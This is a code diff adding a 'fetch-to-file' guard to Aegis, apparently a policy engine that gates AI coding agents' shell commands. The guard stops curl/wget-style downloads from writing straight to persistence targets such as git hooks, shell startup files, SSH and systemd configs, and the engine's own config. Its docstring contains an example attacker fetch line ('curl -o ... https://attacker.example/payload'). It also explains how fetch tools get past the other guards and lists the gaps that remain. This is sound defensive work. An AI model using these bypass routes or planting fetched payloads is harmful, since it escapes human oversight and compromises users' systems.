@@ -4039,6 +4039,187 @@ def rule_ipython_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
     return None
 
 
+# ---- fetch-to-file backstop: closes the "curl -o"/"wget -O" gap every ----------
+# ---- *_protect guard above discloses ------------------------------------------
+
+# Self-protect's own three surfaces (`rule_self_protect`), kept in their own
+# tuple: a hit here is NEVER escapable -- no '# aegis-allow', no
+# AEGIS_ALLOW_* toggle, no policy `allow` regex, checked unconditionally
+# with no `mode` knob -- exactly the posture `rule_self_protect` itself
+# holds for these same files. A fetch-to-file write reaches the identical
+# targets self-protect already treats as non-negotiable; it would be
+# inconsistent to let a human (or, worse, an agent) wave this specific path
+# to them past a gate that closes every other path.
+_FETCH_NEVER_ESCAPABLE = (
+    (patterns.ENFORCEMENT_PATH_RE, "Aegis's own enforcement config (.aegis/, .claude/settings.json)"),
+    (patterns.CONFIG_DIR_RE, "Aegis's own config directory (.aegis/ or .claude/)"),
+    (patterns.AEGIS_SOURCE_RE, "Aegis's own engine source"),
+    (patterns.AEGIS_SKILL_PATH_RE, "Aegis's own shipped skills (.claude/skills/aegis-*)"),
+)
+
+# Every sibling `*_protect` guard's own path surface, reusing each guard's
+# already-defined, already-tested path regex rather than re-deriving it --
+# a hit here is ASK by default (human-only escapable), matching each
+# sibling's own default posture. Deliberately excludes the PATH
+# binary-shadow surface (`rule_path_hijack_protect`): that guard's target
+# is "any trusted command name inside any $PATH bin directory", a
+# name+directory JOINT condition rather than one fixed path regex like
+# every guard below -- folding it in here without real argument parsing
+# risks a worse false-negative/false-positive trade than the disclosed gap
+# is worth, so it stays a known, disclosed gap of this guard instead.
+_FETCH_HUMAN_ESCAPABLE = (
+    (patterns.MCP_CONFIG_PATH_RE, "an MCP server config"),
+    (patterns.CI_WORKFLOW_PATH_RE, "a CI/CD pipeline definition"),
+    (patterns.GIT_HOOKS_PATH_RE, "a git hook"),
+    (patterns.AGENT_DEF_PATH_RE, "an agent/command/output-style definition"),
+    (patterns.AGENT_INSTRUCTIONS_PATH_RE, "CLAUDE.md/AGENTS.md"),
+    (patterns.SHELL_RC_PATH_RE, "a shell startup/profile file"),
+    (patterns.SSH_PERSIST_PATH_RE, "an SSH persistence target"),
+    (patterns.DIRENV_PATH_RE, "a direnv .envrc/direnvrc"),
+    (patterns.PACKAGE_SCRIPTS_PATH_RE, "a package manifest (package.json/composer.json)"),
+    (patterns.REGISTRY_CONFIG_PATH_RE, "a package-registry config"),
+    (patterns.GIT_CONFIG_FILE_PATH_RE, "a git config file"),
+    (patterns.GIT_ATTRS_PATH_RE, "a .gitattributes file"),
+    (patterns.SYSTEMD_UNIT_PATH_RE, "a systemd unit"),
+    (patterns.LAUNCHD_PLIST_PATH_RE, "a launchd plist"),
+    (patterns.LD_PRELOAD_PATH_RE, "the dynamic linker's preload list"),
+    (patterns.LD_SO_CONF_PATH_RE, "the dynamic linker's search-path config"),
+    (patterns.DEVCONTAINER_PATH_RE, "a dev-container config"),
+    (patterns.VSCODE_TASKS_PATH_RE, "a VS Code auto-run task config"),
+    (patterns.VSCODE_SETTINGS_PATH_RE, "VS Code's task auto-run confirmation gate"),
+    (patterns.CLAUDE_LOCAL_SETTINGS_PATH_RE, "Claude Code's local hook config"),
+    (patterns.CONFTEST_PATH_RE, "a pytest conftest.py"),
+    (patterns.PYSITE_CUSTOMIZE_PATH_RE, "a Python interpreter-startup file"),
+    (patterns.PYSITE_PTH_PATH_RE, "a site-packages .pth file"),
+    (patterns.IPYTHON_STARTUP_PATH_RE, "an IPython/Jupyter startup file"),
+)
+
+
+def _fetch_to_file_allowed_by_policy(cfg: dict, text: str) -> bool:
+    for pat in (cfg.get("allow") or []):
+        try:
+            if re.search(str(pat), text, re.IGNORECASE):
+                return True
+        except re.error:
+            continue
+    return False
+
+
+def rule_fetch_to_file_protect(ev: Event, policy=None) -> Optional[Decision]:
+    """Block a shell fetch tool (curl/wget/PowerShell Invoke-WebRequest/
+    Start-BitsTransfer/certutil) writing its response DIRECTLY to a path
+    every guard above already protects.
+
+    THREAT MODEL: every ``*_protect`` guard in this file gates its shell
+    branch on a fixed write-verb set -- a shell redirect, ``cp``/``install``/
+    ``dd``, ``mv``/``rm``, ``sed -i``/``jq``+``sponge``, a forced symlink, an
+    archive/sync tool -- paired with the guard's own protected-path check.
+    None of those verb lists ever included a fetch tool's OWN destination
+    flag: ``curl -o /path/to/target https://attacker.example/payload`` and
+    ``wget -O /path/to/target https://...`` write a file exactly the way
+    ``cp`` does, in one command, with the actual malicious content supplied
+    entirely over the network rather than appearing anywhere in the command
+    text itself -- arguably a STRONGER bypass than the other verbs (nothing
+    in the tool call reveals what gets written, unlike a redirect's inline
+    heredoc or an in-place edit's diff). This is not a theoretical gap:
+    every sibling guard's own docstring in this file discloses it by name,
+    from ``rule_mcp_config_protect`` through ``rule_ipython_startup_
+    protect`` -- fifteen-plus guards sharing one unfixed hole, including
+    ``rule_self_protect`` itself, whose shell branch's write-verb set
+    (``DELETE_OR_MOVE_VERB_RE`` / ``DESTRUCTIVE_DELETE_RE`` /
+    ``WRITE_REDIRECT_RE`` / ``COPY_WRITE_VERB_RE`` / ``INPLACE_WRITE_RE``)
+    has the identical hole for Aegis's OWN policy/config/source -- the one
+    surface this whole file calls "not escapable."
+
+    Rather than adding a sixth write-verb check to each of those guards
+    individually (repeating the same fix N times, with N chances to miss
+    one), this is a single new rule: it re-checks the fetch-to-file verb
+    shape against EVERY already-protected surface in this file at once,
+    reusing each guard's own path regex unchanged.
+
+    Two tiers, matching each target's OWN guard's escapability exactly:
+
+    - ``_FETCH_NEVER_ESCAPABLE`` (self-protect's own surfaces): DENY,
+      unconditional, no ``mode`` knob, no override, no env toggle -- the
+      same posture ``rule_self_protect`` itself holds for these files.
+    - ``_FETCH_HUMAN_ESCAPABLE`` (every sibling ``*_protect`` guard's own
+      path): ASK by default (``policy.fetch_to_file``: ``mode``
+      deny|ask|monitor|off, ``allow`` regexes -- same shape every sibling
+      guard's own config knob uses), escapable by a human only -- a
+      trailing ``# aegis-allow``, or ``AEGIS_ALLOW_FETCH_TO_FILE=1`` set by
+      the orchestrator/human before launch. A spawned agent cannot set its
+      own env for a hook invocation it doesn't control and
+      ``_override_allowed`` already refuses an agent's own ``#
+      aegis-allow``, so neither path is agent-self-escapable, the same
+      invariant every escapable guard in this file holds.
+
+    Config (``policy.fetch_to_file``): ``mode`` (deny|ask|monitor|off,
+    default ask) and ``allow`` govern ONLY the human-escapable tier above --
+    the never-escapable tier has no config surface at all, deliberately,
+    the same way ``rule_self_protect`` itself takes no policy config.
+
+    Honest scope, the same denylist trade-offs every guard in this file
+    discloses: ``FETCH_TO_FILE_VERB_RE`` requires curl's ``-o``/
+    ``--output``/wget's ``-O``/``--output-document`` (or a PowerShell/
+    certutil equivalent) name a literal destination argument in the
+    scanned command -- curl's bare ``-O``/``--remote-name`` and wget's bare
+    ``-P <dir>`` write using a filename taken from the URL itself, putting
+    no literal destination PATH text in the command for the target-path
+    check to match against, so those forms are covered only when combined
+    with an explicit destination the target-path check can still see (see
+    ``FETCH_TO_FILE_VERB_RE``'s own comment in ``patterns.py``); a
+    destination assembled indirectly (shell variable concatenation, a
+    wrapper script) rather than appearing as one contiguous literal defeats
+    every check here, the same "computed indirectly" class every sibling
+    guard already accepts; the PATH binary-shadow surface
+    (``rule_path_hijack_protect``) is not covered at all (see
+    ``_FETCH_HUMAN_ESCAPABLE``'s own comment for why); and, like every
+    other whole-command boolean-AND guard in this file, an unrelated fetch
+    call and an incidental protected-path mention sharing the same command
+    (no real causal link between them) can produce a same-clause false ASK,
+    the accepted trade-off this file's own module docstring and several
+    sibling guards' docstrings already disclose for the identical shape."""
+    if not _is_shell(ev):
+        return None
+    cmd = _shell_scan(ev)
+    if not patterns.FETCH_TO_FILE_VERB_RE.search(cmd):
+        return None
+
+    for rx, label in _FETCH_NEVER_ESCAPABLE:
+        if rx.search(cmd):
+            return Decision(Action.DENY, "fetch-to-file-protect",
+                             f"A fetch tool (curl/wget/...) is writing directly to {label} — "
+                             "the same file(s) self-protection already refuses to let any "
+                             "other write verb touch. Not escapable.")
+
+    cfg = getattr(policy, "fetch_to_file", None) or {}
+    raw_mode = cfg.get("mode", "ask")
+    mode = str(raw_mode).lower()
+    if mode in ("off", "false") or raw_mode is False:
+        return None
+    action = Action.ASK if mode == "ask" else Action.DENY
+
+    for rx, label in _FETCH_HUMAN_ESCAPABLE:
+        if not rx.search(cmd):
+            continue
+        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_FETCH_TO_FILE")
+                or _fetch_to_file_allowed_by_policy(cfg, cmd)):
+            return None
+        decision = Decision(action, "fetch-to-file-protect",
+                             f"A fetch tool (curl/wget/...) is writing directly to {label} "
+                             "— this bypasses every write-verb check (redirect/copy/move/"
+                             "in-place-edit/forced-link/archive-sync) the guard for that "
+                             "surface already runs, since a fetch tool's own destination "
+                             "flag was never on any of those lists. A human may append "
+                             "'# aegis-allow', or set AEGIS_ALLOW_FETCH_TO_FILE=1; a "
+                             "spawned agent cannot.")
+        if mode == "monitor":
+            _record_monitor(ev, decision, "fetch-to-file-protect-monitor")
+            return None
+        return decision
+    return None
+
+
 # ---- workspace confinement: opt-in, file-mutation tools ----------------------
 def _within(path: str, root: str) -> bool:
     return path == root or path.startswith(root + os.sep)
@@ -4452,6 +4633,7 @@ _CORE_RULES = (
     rule_conftest_protect,
     rule_pysite_protect,
     rule_ipython_startup_protect,
+    rule_fetch_to_file_protect,
     rule_workspace_confine,
     rule_migration_protection,
     rule_subagent_spawn,
